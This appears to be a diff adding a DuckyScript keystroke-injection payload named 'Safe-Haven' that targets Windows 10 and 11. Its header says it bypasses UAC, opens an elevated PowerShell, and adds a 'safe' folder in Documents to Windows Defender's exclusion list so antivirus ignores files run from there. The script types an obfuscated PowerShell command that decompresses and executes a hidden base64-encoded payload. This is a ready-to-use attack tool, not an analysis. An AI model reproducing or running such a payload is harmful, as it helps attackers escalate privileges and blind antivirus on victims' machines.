@@ -1,0 +1,25 @@
+REM     Title: Safe-Haven
+
+REM     Author: I am Jakoby
+
+REM     Description: This is a UAC bypass payload that will open an elevated powershell console 
+REM     Next a Directory called "safe" will be generated in your Documents Directory
+REM     The "safe" directory will be added to the Window's Defender Exclusion list
+REM     The AntiVirus will ignore all files downloaded to or ran from here
+
+REM     Target: Windows 10, 11
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+
+DELAY 1000
+
+STRING & ( $PShoME[21]+$psHOME[30]+'x')(NEw-objECt  IO.COMpresSiON.DeflATESTrEAm([sYStEm.io.MeMOrySTreAm] [SYSTEM.CONVERT]::fROMBase64StRing('hZFPT8JAEMW/yqbxWiDqwYRweFvKtipiLRAhvdTusBj6L93qop/eXRKNXvCyyWTe+72Z2YvFXEy8tjHU6T2V5YCOxHzD9sx/aB7dU8fMD49UMP7R5lozn+qC3YIbiBASvMF0hFjhgHCFF8UvMW2wTvjS1SvFE8xiLA0XCA9Ygs8wM3gCf4eYQya8hzj5RojmeAb/dNyt4iWCGAvj+hpb8BZRjBg2JwI2idUL5focIrF99AhHKGDzrG6b8MpxC8cR19gYxwPuE5sfKVdrRLZvLFfcuPzkZx+r+7MfJhNv3JFiuZTMi+6CVZY2u97kHWVBaW9COhs0lcpSd8Fs0VKdFU1V5bX02FCyC3tjNtz9h6i0r6nvX2uls+CtW1N3cnsO7Tn/rpE2oKXOfdI47fOu99OSqGW+ZlcnvKSSejo7pPc9ynnt72lOli8=' ),[SYsTEM.io.cOmpressION.coMPRESsiOnmode]::DEcOMPRESS )| FoREACh-object{NEw-objECt  SySTeM.Io.StreaMreadER( $_ ,[System.teXT.EnCoDINg]::ASCiI) }|foReaCh-objEct {$_.ReAdToEND()} )
+ENTER
+
+
+
+
